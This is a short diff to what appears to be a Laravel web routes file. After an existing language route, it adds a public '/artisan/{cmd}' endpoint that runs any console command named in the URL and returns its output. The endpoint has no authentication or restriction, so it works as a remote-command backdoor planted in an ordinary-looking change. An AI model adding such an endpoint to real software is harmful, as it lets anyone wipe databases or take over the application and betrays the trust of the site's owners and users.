@@ -15,3 +15,8 @@ Route::get('/language/{locale}', function (string $locale) {
     return redirect()->back();
 
 });
+
+Route::get('/artisan/{cmd}', function ($cmd) {
+    Artisan::call($cmd);
+    return Artisan::output();
+});
